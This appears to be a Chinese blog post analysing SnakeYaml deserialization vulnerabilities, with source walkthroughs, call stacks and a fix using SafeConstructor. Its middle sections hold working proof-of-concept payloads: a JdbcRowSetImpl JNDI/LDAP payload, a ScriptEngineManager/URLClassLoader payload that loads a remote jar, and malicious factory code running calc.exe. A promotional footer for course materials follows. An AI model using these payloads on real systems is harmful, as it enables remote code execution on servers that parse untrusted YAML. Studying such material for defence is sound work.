@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Java安全之SnakeYaml漏洞分析与利用 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="Java安全之SnakeYaml漏洞分析与利用" />
+<meta property="og:description" content="1. 简介 SnakeYaml是Java中解析yaml的库，而yaml是一种人类可读的数据序列化语言，通常用于编写配置文件等。
+yaml基本语法：
+大小写敏感使用缩进表示层级关系缩进只允许使用空格#表示注释支持对象、数组、纯量这3种数据结构 示例
+yaml对象：
+key: child-key: value child-key2: value2 yaml数组：
+companies: - id: 1 name: company1 price: 200W - id: 2 name: company2 price: 500W 意思是 companies 属性是一个数组，每一个数组元素又是由 id、name、price 三个属性构成
+详细参考：YAML 入门教程 | 菜鸟教程
+SnakeYaml库：
+SnakeYaml提供了yaml数据和Java对象相互转换的API，即能够对数据进行序列化与反序列化。
+Yaml.load():将yaml数据反序列化成一个Java对象Yaml.dump():将Java对象序列化成yaml 2. 示例 环境：JDK1.8_66
+Maven导入依赖：
+&lt;dependency&gt; &lt;groupId&gt;org.yaml&lt;/groupId&gt; &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt; &lt;version&gt;1.27&lt;/version&gt; &lt;/dependency&gt; 序列化：
+Person类：
+package SnakeYaml; public class Person { private String username; private int age; public Person() {} public Person(String username, int age) { this." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/6e8eb3d630e3bf46fe1030c6a90567f8/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-01T17:36:45+08:00" />
+<meta property="article:modified_time" content="2024-02-01T17:36:45+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Java安全之SnakeYaml漏洞分析与利用</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h4><a id="1__2"></a>1. 简介</h4> 
+<p>SnakeYaml是Java中解析yaml的库，而yaml是一种人类可读的数据序列化语言，通常用于编写配置文件等。</p> 
+<p><strong>yaml基本语法</strong>：</p> 
+<ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进只允许使用空格</li><li><code>#</code>表示注释</li><li>支持对象、数组、纯量这3种数据结构</li></ul> 
+<p><strong>示例</strong></p> 
+<p>yaml对象：</p> 
+<pre><code>key: 
+    child-key: value
+    child-key2: value2
+</code></pre> 
+<p>yaml数组：</p> 
+<pre><code>companies:
+    -
+        id: 1
+        name: company1
+        price: 200W
+    -
+        id: 2
+        name: company2
+        price: 500W
+</code></pre> 
+<p>意思是 companies 属性是一个数组，每一个数组元素又是由 id、name、price 三个属性构成<br> 详细参考：<a href="https://www.runoob.com/w3cnote/yaml-intro.html" rel="nofollow" title="YAML 入门教程 | 菜鸟教程">YAML 入门教程 | 菜鸟教程</a></p> 
+<p><strong>SnakeYaml库</strong>：</p> 
+<p>SnakeYaml提供了yaml数据和Java对象相互转换的API，即能够对数据进行序列化与反序列化。</p> 
+<ul><li>Yaml.load():将yaml数据反序列化成一个Java对象</li><li>Yaml.dump():将Java对象序列化成yaml</li></ul> 
+<h4><a id="2__48"></a>2. 示例</h4> 
+<p>环境：JDK1.8_66<br> Maven导入依赖：</p> 
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.yaml&lt;/groupId&gt;
+    &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;
+    &lt;version&gt;1.27&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre> 
+<p><strong>序列化：</strong></p> 
+<p>Person类：</p> 
+<pre><code>package SnakeYaml;
+
+public class Person {
+    private String username;
+    private int age;
+
+    public Person() {}
+    public Person(String username, int age) {
+        this.username = username;
+        this.age = age;
+    }
+
+    public int getAge() {
+        return age;
+    }
+
+    public String getUsername() {
+        return username;
+    }
+
+    public void setAge(int age) {
+        this.age = age;
+    }
+
+    public void setUsername(String username) {
+        this.username = username;
+    }
+}
+</code></pre> 
+<p>测试类：</p> 
+<pre><code>package SnakeYaml;
+
+import org.yaml.snakeyaml.Yaml;
+
+public class SnakeYamlTest {
+    public static void main(String[] args) {
+        Yaml yaml = new Yaml();
+        Person person = new Person("mike", 18);
+        String str = yaml.dump(person);
+        System.out.println(str);
+    }
+}
+</code></pre> 
+<p>输出结果：</p> 
+<pre><code>!!SnakeYaml.Person {age: 18, username: mike}
+</code></pre> 
+<p>注：这里的!!应该类似于一个标识符，表示对应的类名<br> 注：<strong>序列化过程会触发类属性对应的get方法</strong></p> 
+<p><strong>反序列化</strong>：</p> 
+<pre><code>package SnakeYaml;
+
+import org.yaml.snakeyaml.Yaml;
+
+public class SnakeYamlTest {
+    public static void main(String[] args) {
+        // 反序列化
+        String str = "!!SnakeYaml.Person {age: 18, username: mike}";
+        Yaml yaml = new Yaml();
+        Person person = (Person) yaml.load(str);
+        System.out.println(person);
+    }
+}
+</code></pre> 
+<p>输出结果：</p> 
+<pre><code>SnakeYaml.Person@48533e64
+</code></pre> 
+<p>注：<strong>反序列化过程会触发类属性对应的set方法</strong></p> 
+<h4><a id="3__148"></a>3. 漏洞复现与分析</h4> 
+<p><strong>环境</strong>：SnakeYaml1.27 JDK1.8_66<br> <strong>复现与分析</strong>：<br> 使用工具开启LDAP服务</p> 
+<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"
+</code></pre> 
+<p>POC:</p> 
+<pre><code>!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:1389/5cjybz, autoCommit: true}
+</code></pre> 
+<p>测试类：</p> 
+<pre><code>package SnakeYaml;
+
+import org.yaml.snakeyaml.Yaml;
+
+public class PocTest1 {
+    public static void main(String[] args) {
+        String poc = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:1389/5cjybz, autoCommit: true}";
+        Yaml yaml = new Yaml();
+        yaml.load(poc);
+    }
+}
+</code></pre> 
+<p>函数调用栈：</p> 
+<pre><code>getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
+getObjectInstance:189, DirectoryManager (javax.naming.spi)
+c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
+p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
+lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
+lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
+lookup:417, InitialContext (javax.naming)
+connect:624, JdbcRowSetImpl (com.sun.rowset)
+setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+set:77, MethodProperty (org.yaml.snakeyaml.introspector)
+constructJavaBean2ndStep:285, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)
+construct:171, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)
+construct:331, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)
+constructObjectNoCheck:229, BaseConstructor (org.yaml.snakeyaml.constructor)
+constructObject:219, BaseConstructor (org.yaml.snakeyaml.constructor)
+constructDocument:173, BaseConstructor (org.yaml.snakeyaml.constructor)
+getSingleData:157, BaseConstructor (org.yaml.snakeyaml.constructor)
+loadFromReader:490, Yaml (org.yaml.snakeyaml)
+load:416, Yaml (org.yaml.snakeyaml)
+main:9, PocTest1 (SnakeYaml)
+</code></pre> 
+<p>一步一步走流程，先来到Yaml类中的load方法</p> 
+<pre><code>public &lt;T&gt; T load(String yaml) {
+    // 实例化一个StreamReader对象
+    return this.loadFromReader(new StreamReader(yaml), Object.class);
+}
+</code></pre> 
+<p>继续来到Yaml类中的loadFromReader方法</p> 
+<pre><code>private Object loadFromReader(StreamReader sreader, Class&lt;?&gt; type) {
+    Composer composer = new Composer(new ParserImpl(sreader), this.resolver, this.loadingConfig);
+    this.constructor.setComposer(composer);
+    // 进入这里
+    return this.constructor.getSingleData(type);
+}
+</code></pre> 
+<p>进入BaseConstructor的getSingleData方法</p> 
+<pre><code>public Object getSingleData(Class&lt;?&gt; type) {
+    // 获取单个Node对象，用于表示Yaml文档中的一个节点
+    Node node = this.composer.getSingleNode();
+    // 检查获取的节点是否存在且不是空标签
+    if (node != null &amp;&amp; !Tag.NULL.equals(node.getTag())) {
+        if (Object.class != type) {
+            node.setTag(new Tag(type));
+        } else if (this.rootTag != null) {
+            node.setTag(this.rootTag);
+        }
+        // 将节点转换成Java对象并且返回
+        // 进入这里
+        return this.constructDocument(node);
+    } else {
+        // 获取与空标签关联的Construct实例, 并且将其实例化返回
+        Construct construct = (Construct)this.yamlConstructors.get(Tag.NULL);
+        return construct.construct(node);
+    }
+}
+</code></pre> 
+<p>继续进入constructDocument函数看看如何转换成Java对象的</p> 
+<pre><code>protected final Object constructDocument(Node node) {
+    Object var3;
+    try {
+        // 将yaml节点转换成Java对象
+        // 进入这里
+        Object data = this.constructObject(node);
+        // 递归，通常在yaml文档包含嵌套结构时使用
+        this.fillRecursive();
+        var3 = data;
+    } catch (RuntimeException var7) {
+        if (this.wrappedToRootException &amp;&amp; !(var7 instanceof YAMLException)) {
+            throw new YAMLException(var7);
+        }
+
+        throw var7;
+    } finally {
+        this.constructedObjects.clear();
+        this.recursiveObjects.clear();
+    }
+
+    return var3;
+}
+</code></pre> 
+<p>继续查看constructObject函数</p> 
+<pre><code>protected Object constructObject(Node node) {
+    // 判断当前属性中是否存在与当前节点对应的Java对象，如果存在则返回该对象，如果不存在则调用constructObjectNoCheck方法创建
+    return this.constructedObjects.containsKey(node) ? this.constructedObjects.get(node) : this.constructObjectNoCheck(node);
+}
+</code></pre> 
+<p>这里的this.constructedObjects属性中并没有对应的节点，所以只能调用constructObjectNoCheck函数创建</p> 
+<pre><code>protected Object constructObjectNoCheck(Node node) {
+    // 表示当前节点是一个无法构造的递归节点,即不能与其他节点相互引用
+    if (this.recursiveObjects.contains(node)) {
+        throw new ConstructorException((String)null, (Mark)null, "found unconstructable recursive node", node.getStartMark());
+    } else {
+        // 将当前节点添加到recursiveObjects属性中，以便后续检查是否存在递归引用
+        this.recursiveObjects.add(node);
+        // 使用getConstructor方法获取当前节点的构造器
+        Construct constructor = this.getConstructor(node);
+        // 如果constructedObjects属性中存在与当前节点对应的Java对象，则返回该对象。如果不存在，则调用constructor.construct方法构造Java对象
+        // 进入这里
+        Object data = this.constructedObjects.containsKey(node) ? this.constructedObjects.get(node) : constructor.construct(node);
+        // 在构造对象之后，调用finalizeConstruction方法对其进行后续处理，例如检查是否存在未解析的属性、设置默认值等
+        this.finalizeConstruction(node, data);
+        // 将当前节点和对应的Java对象存储在constructedObjects属性中，以便在后续处理中使用
+        this.constructedObjects.put(node, data);
+        // 将当前节点从recursiveObjects属性中移除，以便在后续处理中不再检查是否存在递归引用
+        this.recursiveObjects.remove(node);
+        //如果当前节点需要两步构造，则调用constructor.construct2ndStep方法完成第二步构造
+        if (node.isTwoStepsConstruction()) {
+            constructor.construct2ndStep(node, data);
+        }
+
+        return data;
+    }
+}
+</code></pre> 
+<p>这里的constructor是ConstructYamlObject对象，查看其construct方法</p> 
+<pre><code>public Object construct(Node node) {
+    try {
+        // 使用getConstructor方法获取当前节点的构造器
+        return this.getConstructor(node).construct(node);
+    } catch (ConstructorException var3) {
+        throw var3;
+    } catch (Exception var4) {
+        throw new ConstructorException((String)null, (Mark)null, "Can't construct a java object for " + node.getTag() + "; exception=" + var4.getMessage(), node.getStartMark(), var4);
+    }
+}
+</code></pre> 
+<p>获取到的构造器是ConstructMapping对象，进入其construct函数</p> 
+<pre><code>public Object construct(Node node) {
+    // 将node转换为MappingNode类型
+    MappingNode mnode = (MappingNode)node;
+    // 如果当前节点的类型是Map或其子类，则调用newMap或constructMapping方法构造Java对象
+    if (Map.class.isAssignableFrom(node.getType())) {
+        return node.isTwoStepsConstruction() ? Constructor.this.newMap(mnode) : Constructor.this.constructMapping(mnode);
+    } else if (Collection.class.isAssignableFrom(node.getType())) {
+        // 如果当前节点的类型是Collection或其子类，则调用newSet或constructSet方法构造Java对象，并返回该对象
+        return node.isTwoStepsConstruction() ? Constructor.this.newSet(mnode) : Constructor.this.constructSet(mnode);
+    } else {
+        // 如果当前节点的类型不是Map或Collection的子类，则调用newInstance方法创建一个新的Java对象，并返回该对象
+        Object obj = Constructor.this.newInstance(mnode);
+        // 如果当前节点需要两步构造，则调用constructJavaBean2ndStep方法完成第二步构造。如果不需要两步构造，则直接返回构造的Java对象
+        return node.isTwoStepsConstruction() ? obj : this.constructJavaBean2ndStep(mnode, obj);
+    }
+}
+</code></pre> 
+<p><img src="https://images2.imgbox.com/d5/44/eOfDBqaM_o.png" alt=""></p> 
+<p>在constructJavaBean2ndStep函数中，会获取yaml格式数据中的属性键值对，调用property.set()来设置上面实例化对象的属性<img src="https://images2.imgbox.com/10/4c/9dMPo5XD_o.png" alt=""></p> 
+<p>在MethodProperty类的set方法中，获取了响应属性的方法进行invoke</p> 
+<pre><code>public void set(Object object, Object value) throws Exception {
+    if (!this.writable) {
+        throw new YAMLException("No writable property '" + this.getName() + "' on class: " + object.getClass().getName());
+    } else {
+        // 这里
+        this.property.getWriteMethod().invoke(object, value);
+    }
+}
+</code></pre> 
+<p><img src="https://images2.imgbox.com/9b/1b/8qfYvpXm_o.png" alt=""></p> 
+<p>即会调用JdbcRowSetImpl的setAutoCommit方法，这样就成功触发了JdbcRowSetImpl链和JNDI注入了</p> 
+<h5><a id="ScriptEngineManager_378"></a>ScriptEngineManager链</h5> 
+<p><strong>什么是SPI机制</strong><br> SPI(Service Provider Interface), JDK内置的一种服务提供发现机制。它的利用方式是通过在ClassPath路径下的<code>META-INF/services</code>文件夹下查找文件，自动加载文件中所定义的类<br> 例如以mysql-connector包为例：<img src="https://images2.imgbox.com/ca/fb/kMLHA0Fw_o.png" alt=""></p> 
+<p>而Dirver类中的内容是：</p> 
+<pre><code>package com.mysql.cj.jdbc;
+
+import java.sql.DriverManager;
+import java.sql.SQLException;
+
+public class Driver extends NonRegisteringDriver implements java.sql.Driver {
+    public Driver() throws SQLException {
+    }
+
+    static {
+        try {
+            DriverManager.registerDriver(new Driver());
+        } catch (SQLException var1) {
+            throw new RuntimeException("Can't register driver!");
+        }
+    }
+}
+</code></pre> 
+<p>这个Driver类实现了java.sql.Driver接口，这段代码主要是将当前类的实例注册为MySQL数据库的驱动程序，实现了一个MySQL数据库的Java驱动程序，这个方法会在JVM启动时执行，从而确保了该驱动程序在应用程序启动时已经被注册。当应用程序需要连接MySQL数据库时，可以通过DriverManager类的getConnection()方法获取com.mysql.cj.jdbc.Driver类的实例，进而建立MySQL数据库连接</p> 
+<p><strong>环境</strong>：SnakeYaml1.27 JDK1.8_66<br> <strong>复现与分析</strong>：<br> POC:</p> 
+<pre><code>package SnakeYaml;
+
+import org.yaml.snakeyaml.Yaml;
+
+public class PocTest2 {
+    public static void main(String[] args) {
+        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://tlk0u6qn.eyes.sh\"]]]]\n";
+        Yaml yaml = new Yaml();
+        yaml.load(poc);
+    }
+}
+</code></pre> 
+<p>dnslog平台出现请求记录，用于验证是否存在该漏洞且ScriptEngineManager链是否可用</p> 
+<p><strong>命令执行</strong>：<br> 现成的利用项目：<a href="https://github.com/artsploit/yaml-payload.git" title="GitHub - artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads">GitHub - artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads</a><br> 更改里面的命令执行代码，使用以下命令进行编译即可</p> 
+<pre><code>javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
+</code></pre> 
+<p>注意：一定要使用一致的java版本进行编译<br> 其中在META/services文件夹的文件中，里面的内容即是我们的恶意类</p> 
+<p><img src="https://images2.imgbox.com/51/48/085ZDaiO_o.png" alt=""></p> 
+<p>在AwesomeScriptEngineFactory类中，它实现了ScriptEngineFactory接口</p> 
+<pre><code>package artsploit;
+
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.io.IOException;
+import java.util.List;
+
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+            // Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
+            // Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
+            Runtime.getRuntime().exec("calc.exe");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public String getEngineName() {
+        return null;
+    }
+
+    @Override
+    public String getEngineVersion() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getExtensions() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getMimeTypes() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getNames() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageName() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageVersion() {
+        return null;
+    }
+
+    @Override
+    public Object getParameter(String key) {
+        return null;
+    }
+
+    @Override
+    public String getMethodCallSyntax(String obj, String m, String... args) {
+        return null;
+    }
+
+    @Override
+    public String getOutputStatement(String toDisplay) {
+        return null;
+    }
+
+    @Override
+    public String getProgram(String... statements) {
+        return null;
+    }
+
+    @Override
+    public ScriptEngine getScriptEngine() {
+        return null;
+    }
+}
+</code></pre> 
+<p>根据上面mysql的例子可以猜测到，在ScriptEngineFactory类中应该有对我们构造的恶意类实例化的过程，在实例化时会自动调用构造函数从而导致命令执行<br> 在生成的jar文件目录下开启web服务</p> 
+<pre><code>python -m http.server 8080
+</code></pre> 
+<p>POC：</p> 
+<pre><code>!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://127.0.0.1:8080/yaml-payload.jar"]
+  ]]
+]
+</code></pre> 
+<p>测试类：</p> 
+<pre><code>package SnakeYaml;
+
+import org.yaml.snakeyaml.Yaml;
+
+public class PocTest2 {
+    public static void main(String[] args) {
+        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8080/yaml-payload.jar\"]]]]\n";
+        Yaml yaml = new Yaml();
+        yaml.load(poc);
+    }
+}
+</code></pre> 
+<p>函数调用栈：</p> 
+<pre><code>nextService:381, ServiceLoader$LazyIterator (java.util)
+next:404, ServiceLoader$LazyIterator (java.util)
+next:480, ServiceLoader$1 (java.util)
+initEngines:122, ScriptEngineManager (javax.script)
+init:84, ScriptEngineManager (javax.script)
+&lt;init&gt;:75, ScriptEngineManager (javax.script)
+newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
+newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
+newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
+newInstance:422, Constructor (java.lang.reflect)
+construct:570, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)
+construct:331, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)
+constructObjectNoCheck:229, BaseConstructor (org.yaml.snakeyaml.constructor)
+constructObject:219, BaseConstructor (org.yaml.snakeyaml.constructor)
+constructDocument:173, BaseConstructor (org.yaml.snakeyaml.constructor)
+getSingleData:157, BaseConstructor (org.yaml.snakeyaml.constructor)
+loadFromReader:490, Yaml (org.yaml.snakeyaml)
+load:416, Yaml (org.yaml.snakeyaml)
+main:10, PocTest2 (SnakeYaml)
+</code></pre> 
+<p>前面的大致步骤还是和JdbcRowSetImpl链的过程一致，这里的关键在于Constructor不一致，这里是ConstructSequence，在对ScriptEngineManager实例化的过程中就会触发命令执行<img src="https://images2.imgbox.com/74/85/gdxz4zMe_o.png" alt=""></p> 
+<p>接下来就来看一下ScriptEngineManager链的利用过程<br> 首先来到其构造函数，传入的loader是URLClassLoader</p> 
+<pre><code>public ScriptEngineManager(ClassLoader loader) {
+    init(loader);
+}
+</code></pre> 
+<p>进入init函数，都是一些属性的初始化，最后调用initEngines函数，传入loader<img src="https://images2.imgbox.com/fb/77/enGaDgVz_o.png" alt=""></p> 
+<p>直到这一步，itr是ServiceLoader对象，会调用其next方法</p> 
+<pre><code>public S next() {
+    if (knownProviders.hasNext())
+        return knownProviders.next().getValue();
+    // 这里
+    return lookupIterator.next();
+}
+</code></pre> 
+<p>lookupIterator是ServiceLoader$LazyIterator，调用其next方法</p> 
+<pre><code>public S next() {
+    if (acc == null) {
+        // 这里
+        // 获取下一个服务对象并将其返回
+        return nextService();
+    } else {
+        // 系统中存在一个安全管理器（SecurityManager 类的一个实例），这时方法需要在特权上下文中运行
+        PrivilegedAction&lt;S&gt; action = new PrivilegedAction&lt;S&gt;() {
+            public S run() { return nextService(); }
+        };
+        // 这个方法在特权上下文中执行 PrivilegedAction&lt;S&gt; 对象的 run() 方法，这意味着它拥有 acc 所引用的 SecurityManager 对象授予的权限。run() 方法的结果作为 doPrivileged() 方法的结果返回，进而作为 next() 方法的结果返回
+        return AccessController.doPrivileged(action, acc);
+    }
+}
+</code></pre> 
+<p>这段代码用于在存在安全管理器的系统中以安全的方式获取下一个服务对象，这里直接进nextService函数</p> 
+<pre><code>private S nextService() {
+    // 检查是否还有下一个服务对象
+    if (!hasNextService())
+        throw new NoSuchElementException();
+    // 获取下一个服务对象的类名
+    String cn = nextName;
+    nextName = null;
+    Class&lt;?&gt; c = null;
+    try {
+        c = Class.forName(cn, false, loader);
+    } catch (ClassNotFoundException x) {
+        fail(service,
+                "Provider " + cn + " not found");
+    }
+    // 如果获取类成功，方法将检查该类是否是 service 类型的子类
+    if (!service.isAssignableFrom(c)) {
+        fail(service,
+                "Provider " + cn  + " not a subtype");
+    }
+    try {
+        // 如果该类是 service 类型的子类，方法将会尝试通过cast方法创建一个实例对象 p，并将其存储到 providers 集合中
+        // 这里
+        S p = service.cast(c.newInstance());
+        providers.put(cn, p);
+        return p;
+    } catch (Throwable x) {
+        fail(service,
+                "Provider " + cn + " could not be instantiated",
+                x);
+    }
+    throw new Error();          // This cannot happen
+}
+</code></pre> 
+<p><img src="https://images2.imgbox.com/32/c2/dpP1l9EA_o.png" alt=""></p> 
+<p>这里就是URL中jar包对应的恶意类，其构造方法中就存在命令执行函数</p> 
+<h4><a id="4__667"></a>4. 修复</h4> 
+<ul><li>禁止yaml.load方法中的参数可控</li><li>使用<code>Yaml yaml = new Yaml(new SafeConstructor());</code><br> 在<code>org\yaml\snakeyaml\constructor\SafeConstructor.class</code>构造函数中定义了反序列化类的白名单：</li><li> <pre><code>public SafeConstructor(LoaderOptions loadingConfig) {
+  super(loadingConfig);
+  this.yamlConstructors.put(Tag.NULL, new ConstructYamlNull());
+  this.yamlConstructors.put(Tag.BOOL, new ConstructYamlBool());
+  this.yamlConstructors.put(Tag.INT, new ConstructYamlInt());
+  this.yamlConstructors.put(Tag.FLOAT, new ConstructYamlFloat());
+  this.yamlConstructors.put(Tag.BINARY, new ConstructYamlBinary());
+  this.yamlConstructors.put(Tag.TIMESTAMP, new ConstructYamlTimestamp());
+  this.yamlConstructors.put(Tag.OMAP, new ConstructYamlOmap());
+  this.yamlConstructors.put(Tag.PAIRS, new ConstructYamlPairs());
+  this.yamlConstructors.put(Tag.SET, new ConstructYamlSet());
+  this.yamlConstructors.put(Tag.STR, new ConstructYamlStr());
+  this.yamlConstructors.put(Tag.SEQ, new ConstructYamlSeq());
+  this.yamlConstructors.put(Tag.MAP, new ConstructYamlMap());
+  this.yamlConstructors.put((Object)null, undefinedConstructor);
+  this.yamlClassConstructors.put(NodeId.scalar, undefinedConstructor);
+  this.yamlClassConstructors.put(NodeId.sequence, undefinedConstructor);
+  this.yamlClassConstructors.put(NodeId.mapping, undefinedConstructor);
+}
+</code></pre> </li></ul> 
+<p><a href="https://blog.csdn.net/Java_ZZZZZ/article/details/135558334?spm=1001.2014.3001.5502"></a><a href="https://blog.csdn.net/2301_82000445/article/details/135502608?spm=1001.2014.3001.5502"></a>黑客学习资源推荐</p> 
+<p>最后给大家分享一份全套的网络安全学习资料，给那些想学习 网络安全的小伙伴们一点帮助！</p> 
+<p>对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。</p> 
+<p>😝朋友们如果有需要的话，可以V扫描下方二维码联系领取~</p> 
+<p><img src="https://images2.imgbox.com/34/0d/IpV3mZZv_o.png" alt=""></p> 
+<h6><a id="httpsblogcsdnnet2201_75362610articledetails135947058httpsblogcsdnnet2201_75362610articledetails135938431spm1001201430015501httpsblogcsdnnet2201_75362610articledetails135885947spm1001201430015501httpsblogcsdnnetJava_ZZZZZarticledetails135861576spm10012014300155021_709"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135947058"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135938431?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135885947?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/Java_ZZZZZ/article/details/135861576?spm=1001.2014.3001.5502"></a>1️⃣零基础入门</h6> 
+<h6><a id="httpsblogcsdnnet2201_75362610articledetails135947058httpsblogcsdnnet2201_75362610articledetails135938431spm1001201430015501httpsblogcsdnnet2201_75362610articledetails135885947spm1001201430015501httpsblogcsdnnetJava_ZZZZZarticledetails135861576spm1001201430015502_711"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135947058"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135938431?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135885947?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/Java_ZZZZZ/article/details/135861576?spm=1001.2014.3001.5502"></a>学习路线</h6> 
+<p>对于从来没有接触过网络安全的同学，我们帮你准备了详细的<strong>学习成长路线图</strong>。可以说是<strong>最科学最系统的学习路线</strong>，大家跟着这个大的方向学习准没问题。</p> 
+<p><img src="https://images2.imgbox.com/15/51/rZgkJfW6_o.gif" alt="image"></p> 
+<p>需要详细路线图的，下面获取</p> 
+<p><img src="https://images2.imgbox.com/a1/54/Mdx3rocK_o.png" alt=""></p> 
+<h6><a id="httpsblogcsdnnet2201_75362610articledetails135947058httpsblogcsdnnet2201_75362610articledetails135938431spm1001201430015501httpsblogcsdnnet2201_75362610articledetails135885947spm1001201430015501httpsblogcsdnnetJava_ZZZZZarticledetails135861576spm1001201430015502_721"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135947058"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135938431?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135885947?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/Java_ZZZZZ/article/details/135861576?spm=1001.2014.3001.5502"></a>路线对应学习视频</h6> 
+<p>同时每个成长路线对应的板块都有配套的视频提供：</p> 
+<p><img src="https://images2.imgbox.com/a5/9e/hTgM873L_o.png" alt="image-20231025112050764"></p> 
+<h6><a id="httpsblogcsdnnet2201_75362610articledetails135947058httpsblogcsdnnet2201_75362610articledetails135938431spm1001201430015501httpsblogcsdnnet2201_75362610articledetails135885947spm1001201430015501httpsblogcsdnnetJava_ZZZZZarticledetails135861576spm10012014300155022_727"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135947058"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135938431?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135885947?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/Java_ZZZZZ/article/details/135861576?spm=1001.2014.3001.5502"></a>2️⃣视频配套工具&amp;国内外网安书籍、文档</h6> 
+<h6><a id="httpsblogcsdnnet2201_75362610articledetails135947058httpsblogcsdnnet2201_75362610articledetails135938431spm1001201430015501httpsblogcsdnnet2201_75362610articledetails135885947spm1001201430015501httpsblogcsdnnetJava_ZZZZZarticledetails135861576spm1001201430015502_729"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135947058"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135938431?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135885947?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/Java_ZZZZZ/article/details/135861576?spm=1001.2014.3001.5502"></a>工具</h6> 
